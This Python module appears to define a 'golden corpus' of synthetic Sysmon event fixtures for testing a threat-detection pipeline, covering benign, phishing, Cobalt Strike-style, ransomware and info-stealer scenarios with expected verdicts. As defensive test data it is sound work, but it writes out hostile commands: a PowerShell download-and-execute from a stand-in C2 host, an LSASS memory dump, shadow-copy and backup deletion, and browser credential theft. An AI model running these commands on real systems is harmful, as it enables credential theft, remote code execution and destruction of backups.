"""v2/ingestion/golden_corpus.py · The Golden Investigation Corpus.

Six representative datasets used to validate the ingestion engine
end-to-end. Each fixture ships as an in-memory list of CES records
(so the pipeline can be exercised without any file I/O).

Datasets (per operator brief · 2026-02):
    1. clean_workstation   → benign
    2. office_phishing     → critical
    3. cobalt_strike       → critical
    4. enterprise_admin    → benign / informational
    5. ransomware          → critical
    6. info_stealer        → high / critical

Each dataset also exposes an equivalent Sysmon XML byte-stream so the
XML normalizer round-trip is testable against real-shaped fixtures.
"""
from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Callable

from .canonical import CanonicalEventRecord, IngestionProvenance


@dataclass
class GoldenDataset:
    id: str
    label: str
    description: str
    expected_verdict: str                       # "benign" | "informational" | "high" | "critical"
    build: Callable[[], list[CanonicalEventRecord]]

    def records(self) -> list[CanonicalEventRecord]:
        return self.build()


# ─── Helpers ─────────────────────────────────────────────────────────
_BASE_TS = datetime(2026, 2, 25, 14, 0, 0, tzinfo=timezone.utc)


def _ts(offset_s: int) -> str:
    return (_BASE_TS + timedelta(seconds=offset_s)).isoformat()


def _P(name: str, source: str = "sysmon", fmt: str = "sysmon_xml") -> IngestionProvenance:
    return IngestionProvenance(origin="golden-corpus", format=fmt, source=source,
                                filename=f"golden-{name}", normalizer="golden@1.0")


def _sysmon_proc(offset: int, computer: str, image: str, cmdline: str,
                 parent_image: str, *, pid: str = "1000", ppid: str = "500",
                 user: str = "CORP\\alice", extra: dict | None = None) -> CanonicalEventRecord:
    r = CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=1,
        channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer,
        user=user,
        process_id=pid,
        parent_process_id=ppid,
        image=image,
        command_line=cmdline,
        parent_image=parent_image,
        raw_event=(extra or {}),
        provenance=_P("proc"),
    )
    return r


def _sysmon_net(offset: int, computer: str, image: str,
                dst_ip: str, dst_port: str, dns: str = "") -> CanonicalEventRecord:
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=3, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        dst_ip=dst_ip, dst_port=dst_port, protocol="tcp", dns_query=dns,
        provenance=_P("net"),
    )


def _sysmon_reg(offset: int, computer: str, image: str,
                key: str, value: str, data: str) -> CanonicalEventRecord:
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=13, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        registry_key=key, registry_value=value, registry_data=data,
        provenance=_P("reg"),
    )


def _sysmon_file(offset: int, computer: str, image: str,
                 path: str, action: str = "create") -> CanonicalEventRecord:
    eid = 11 if action == "create" else 23
    return CanonicalEventRecord(
        timestamp=_ts(offset),
        provider="Microsoft-Windows-Sysmon",
        event_id=eid, channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer, image=image,
        file_path=path,
        provenance=_P("file"),
    )


# ─── Dataset 1 · Clean workstation ───────────────────────────────────
def _ds_clean() -> list[CanonicalEventRecord]:
    HOST = "WKS-01"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\wininit.exe", "wininit.exe", r"C:\Windows\System32\smss.exe"),
        _sysmon_proc(1, HOST, r"C:\Windows\explorer.exe", "explorer.exe", r"C:\Windows\System32\userinit.exe"),
        _sysmon_proc(10, HOST, r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe --start-page",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(11, HOST, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    "142.250.185.68", "443", "www.google.com"),
        _sysmon_proc(20, HOST, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                     "WINWORD.EXE /n \"C:\\Users\\alice\\Docs\\report.docx\"", r"C:\Windows\explorer.exe"),
        _sysmon_proc(30, HOST, r"C:\Program Files\Microsoft\Teams\current\Teams.exe",
                     "Teams.exe --system-initiated", r"C:\Windows\explorer.exe"),
        _sysmon_proc(45, HOST, r"C:\Program Files\Windows Defender\MsMpEng.exe",
                     "MsMpEng.exe", r"C:\Windows\System32\services.exe"),
        _sysmon_proc(60, HOST, r"C:\Windows\System32\svchost.exe",
                     "svchost.exe -k netsvcs -p", r"C:\Windows\System32\services.exe"),
        _sysmon_net(62, HOST, r"C:\Windows\System32\svchost.exe",
                    "20.50.201.194", "443", "update.microsoft.com"),
    ]


# ─── Dataset 2 · Office phishing ─────────────────────────────────────
def _ds_office_phishing() -> list[CanonicalEventRecord]:
    HOST = "FIN-07"
    return [
        _sysmon_proc(0, HOST, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                     "WINWORD.EXE \"C:\\Users\\bob\\Downloads\\Invoice.docm\"",
                     r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\wscript.exe",
                     "wscript.exe //E:vbscript //B \"C:\\Users\\bob\\AppData\\Local\\Temp\\decoy.vbs\"",
                     r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\cmd.exe",
                     "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAKABJAG4A...",
                     r"C:\Windows\System32\wscript.exe"),
        _sysmon_proc(5, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -nop -w hidden -enc SQBFAFgAKABJAG4A...",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_net(7, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "185.234.219.5", "443", "cdn-update[.]net"),
        _sysmon_file(9, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     r"C:\Users\bob\AppData\Roaming\updater.exe"),
        _sysmon_reg(10, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Updater",
                    r"C:\Users\bob\AppData\Roaming\updater.exe"),
        _sysmon_proc(20, HOST, r"C:\Users\bob\AppData\Roaming\updater.exe",
                     "updater.exe -beacon",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_net(21, HOST, r"C:\Users\bob\AppData\Roaming\updater.exe",
                    "185.234.219.5", "443", "cdn-update[.]net"),
    ]


# ─── Dataset 3 · Cobalt Strike-style intrusion ───────────────────────
def _ds_cobalt_strike() -> list[CanonicalEventRecord]:
    HOST = "ENG-42"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(2, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "203.0.113.7", "443", "beacon.example[.]com"),
        _sysmon_proc(6, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\ProgramData\\beacon.dll,StartW",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_proc(9, HOST, r"C:\Windows\System32\lsass.exe",
                     "lsass.exe", r"C:\Windows\System32\wininit.exe"),
        _sysmon_proc(10, HOST, r"C:\Windows\System32\rundll32.exe",
                     "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 632 c:\\pd.dmp full",
                     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        _sysmon_reg(12, HOST, r"C:\Windows\System32\services.exe",
                    r"HKLM\SYSTEM\CurrentControlSet\Services\UpdaterSvc\ImagePath",
                    "ImagePath", r"C:\ProgramData\beacon.exe"),
        _sysmon_proc(20, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     "powershell -c Invoke-Command -ComputerName DC01 -ScriptBlock {whoami /all}",
                     r"C:\Windows\explorer.exe"),
        _sysmon_net(21, HOST, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "10.10.10.5", "5985", "DC01"),
    ]


# ─── Dataset 4 · Enterprise administration ───────────────────────────
def _ds_enterprise_admin() -> list[CanonicalEventRecord]:
    HOST = "SRV-DC01"
    return [
        _sysmon_proc(0, HOST, r"C:\Windows\ccmsetup\ccmexec.exe", "ccmexec.exe",
                     r"C:\Windows\System32\services.exe", user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(4, HOST, r"C:\Windows\CCM\CcmExec.exe",
                     "CcmExec.exe -install", r"C:\Windows\ccmsetup\ccmexec.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(10, HOST, r"C:\Windows\System32\PsExec.exe",
                     "PsExec.exe \\\\WKS-14 -s cmd.exe /c ipconfig",
                     r"C:\Windows\explorer.exe", user="CORP\\admin"),
        _sysmon_proc(20, HOST, r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                     "WmiPrvSE.exe", r"C:\Windows\System32\svchost.exe",
                     user="NT AUTHORITY\\SYSTEM"),
        _sysmon_proc(25, HOST, r"C:\Windows\System32\winrm.cmd",
                     "winrm quickconfig", r"C:\Windows\System32\cmd.exe",
                     user="CORP\\admin"),
    ]


# ─── Dataset 5 · Ransomware ──────────────────────────────────────────
def _ds_ransomware() -> list[CanonicalEventRecord]:
    HOST = "FILE-SRV-01"
    events = [
        _sysmon_proc(0, HOST, r"C:\Users\Public\encryptor.exe",
                     "encryptor.exe --wipe --shadow",
                     r"C:\Windows\System32\cmd.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\vssadmin.exe",
                     "vssadmin.exe delete shadows /all /quiet",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\wbadmin.exe",
                     "wbadmin.exe delete catalog -quiet",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(6, HOST, r"C:\Windows\System32\bcdedit.exe",
                     "bcdedit.exe /set {default} recoveryenabled No",
                     r"C:\Users\Public\encryptor.exe"),
        _sysmon_proc(8, HOST, r"C:\Windows\System32\net.exe",
                     "net stop MSSQLSERVER /y",
                     r"C:\Users\Public\encryptor.exe"),
    ]
    # Simulate mass encryption
    for i in range(20):
        events.append(_sysmon_file(10 + i, HOST,
                                     r"C:\Users\Public\encryptor.exe",
                                     rf"C:\Share\project_{i}.docx.locked"))
    events.append(_sysmon_file(35, HOST, r"C:\Users\Public\encryptor.exe",
                                 r"C:\Share\HOW_TO_DECRYPT.txt"))
    return events


# ─── Dataset 6 · Info-stealer ────────────────────────────────────────
def _ds_info_stealer() -> list[CanonicalEventRecord]:
    HOST = "HR-11"
    return [
        _sysmon_proc(0, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     "resume.exe", r"C:\Windows\explorer.exe"),
        _sysmon_file(1, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        _sysmon_file(2, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Roaming\Mozilla\Firefox\Profiles\default\logins.json"),
        _sysmon_file(3, HOST, r"C:\Users\eve\Downloads\resume.exe",
                     r"C:\Users\eve\AppData\Local\Temp\stolen.zip"),
        _sysmon_net(5, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    "45.9.148.32", "443", "exfil-cdn[.]top"),
        _sysmon_net(6, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    "45.9.148.32", "443", "exfil-cdn[.]top"),
        _sysmon_reg(7, HOST, r"C:\Users\eve\Downloads\resume.exe",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "Adobe", r"C:\Users\eve\AppData\Roaming\adobe_update.exe"),
    ]


GOLDEN_CORPUS: dict[str, GoldenDataset] = {
    "clean_workstation": GoldenDataset(
        id="clean_workstation", label="Clean workstation",
        description="Windows boot · Explorer · Chrome · Office · Teams · Defender · Windows Update",
        expected_verdict="benign", build=_ds_clean),
    "office_phishing": GoldenDataset(
        id="office_phishing", label="Office phishing → PowerShell → persistence",
        description="Word macro → wscript → cmd → encoded PowerShell → download → Run key",
        expected_verdict="critical", build=_ds_office_phishing),
    "cobalt_strike": GoldenDataset(
        id="cobalt_strike", label="Cobalt Strike-style intrusion",
        description="PowerShell beacon → rundll32 → LSASS dump → service persistence → lateral WinRM",
        expected_verdict="critical", build=_ds_cobalt_strike),
    "enterprise_admin": GoldenDataset(
        id="enterprise_admin", label="Enterprise administration",
        description="SCCM / PsExec / WMI / WinRM · legitimate admin activity",
        expected_verdict="benign", build=_ds_enterprise_admin),
    "ransomware": GoldenDataset(
        id="ransomware", label="Ransomware",
        description="Shadow copy deletion · backup destruction · mass file encryption · ransom note",
        expected_verdict="critical", build=_ds_ransomware),
    "info_stealer": GoldenDataset(
        id="info_stealer", label="Info-stealer",
        description="Browser credential access · archive creation · HTTPS exfiltration · Run-key persistence",
        expected_verdict="critical", build=_ds_info_stealer),
}


def list_datasets() -> list[dict]:
    return [{
        "id": d.id, "label": d.label,
        "description": d.description,
        "expected_verdict": d.expected_verdict,
        "event_count": len(d.records()),
    } for d in GOLDEN_CORPUS.values()]


def get_dataset(dataset_id: str) -> GoldenDataset | None:
    return GOLDEN_CORPUS.get(dataset_id)
